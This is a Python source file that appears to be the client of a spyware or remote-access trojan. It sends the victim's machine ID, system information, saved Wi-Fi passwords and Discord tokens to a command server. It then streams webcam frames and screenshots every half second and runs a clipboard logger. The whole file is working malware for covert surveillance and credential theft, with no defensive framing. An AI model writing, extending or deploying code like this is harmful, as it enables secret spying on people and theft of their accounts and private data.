import cv2
from numpy import array
from pyautogui import screenshot
from requests import post
from time import sleep
import re
import uuid
import subprocess


from modules.discordgrabber import GetDiscordTokens
from modules.pcinfo import System_information
from modules.wifipasswordsgraber import getPasswords
from modules.clipboardlogger import logger

# Initialize the camera
try:
	camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
except Exception as e:
	camera = cv2.VideoCapture('NoCamera.avi')
	print(e)

# Define the IP address of the remote server
remote_server = '127.0.0.1:5000'
protocol = 'http'

current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

# Request a client ID from the server
try:
	clientIdreq = post(f'{protocol}://{remote_server}/client', json={"uuid": current_machine_id, "osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": GetDiscordTokens().replace("\n", "<br>")})
	clientId = clientIdreq.text
	print(clientId)
except Exception as e:
	print(e)
	exit(1)

previous_clipboard_content = ''

while True:
	if camera:
		success, frame = camera.read()
		if not success or frame is None:
			break

	# Capture the current screen
	myScreenshot = screenshot()
	myScreenshot_np = array(myScreenshot)

	# Encode the frames as .jpg
	_, camera_jpg = cv2.imencode('.jpg', frame)
	_, screen_jpg = cv2.imencode('.jpg', myScreenshot_np)

	# Send the frames to the server
	img_response = post(f'{protocol}://{remote_server}/send_camera?id={clientId}', data=camera_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})
	screen_response = post(f'{protocol}://{remote_server}/send_screen?id={clientId}', data=screen_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})

	logger(protocol, remote_server, clientId)

	sleep(0.5)